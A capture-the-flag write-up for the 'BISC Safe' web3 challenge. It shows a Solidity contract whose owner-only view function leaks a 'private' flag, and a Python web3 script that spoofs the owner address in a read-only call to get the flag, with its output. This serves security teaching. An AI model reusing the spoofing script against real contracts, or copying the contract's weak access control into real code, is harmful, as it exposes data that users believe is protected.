### Challenge Overview
This is an esy web3 challenge with only one file ``safe.sol``

This challenge involves a simple smart contract deployed on the Sepolia test network. The contract, Safe, contains a private flag that can only be accessed by the owner. However, due to a vulnerability in the contract, we can exploit it to retrieve the flag without being the owner.
```C#
// SPDX-License-Identifier: MIT
pragma solidity >= 0.7.0 < 0.9.0;

contract Safe {
    address public owner;
    string private flag =  "bisc2023{FAKE_FLAG}";

    constructor() {
        owner = msg.sender;
    }

    function opensafe() public view returns (string memory) {
        if(owner == msg.sender){
            return flag;
        }
        else {
            return "Your not owner!!";
        }
    }

    function changeOwner(address _owner) public {
        require(owner == msg.sender, "Your not owner!!");
        owner = _owner;
    }
}


```

In this challenge, the smart contract was deployed in test Sepolia network. 
There are two functions in this code, ``openSafe() and changeOwner()`` 
* openSafe(): read flag if you are owner
* changeOwner(): allow current owner transfer ownership to another address


### Exploitation

#### Identify the Owner:

The owner is a public variable, so we can call the owner() function to retrieve the owner's address.
#### Spoof the Caller:

Using Web3, we call the opensafe() function and set the from parameter to the owner's address.
Since opensafe() is a view function, the blockchain does not verify the signature of the caller, allowing us to spoof the address.
#### Retrieve the Flag:

The contract believes the caller is the owner and returns the private flag.

#### Script Code
```py
from web3 import Web3

RPC_URL = "https://eth-sepolia.public.blastapi.io"
CONTRACT_ADDRESS = "0x5e992854Bd912ae170b7b5b8a64323e4e5E0feAF"

ABI = [
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "opensafe",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function"
    }
]

web3 = Web3(Web3.HTTPProvider(RPC_URL))
contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)

def get_flag():
    owner_address = contract.functions.owner().call()
    print(f"Owner address: {owner_address}")
    
    print("Exploiting vulnerability...")
    flag = contract.functions.opensafe().call({'from': owner_address})
    
    print(f"Flag: {flag}")
    return flag

if __name__ == "__main__":
    print(f"Connected to blockchain: {web3.is_connected()}")
    
    if web3.is_connected():
        get_flag()
    else:
        print("Cannot connect to blockchain. Check the RPC URL.")

```

#### Result
```
khanh@ubuntu:~/Documents/WorkSpaceDreamHack/blockchain/BISC-safe$ python3 exploit.py 
Connected to blockchain: True
Owner address: 0xde90dD6033BFA475e3d517ec882c253B4E6D8B64
Exploiting vulnerability...
Flag: bisc2023{W0w_f0und_The_6aCk_do0r_t0_th3_5af3!!}
```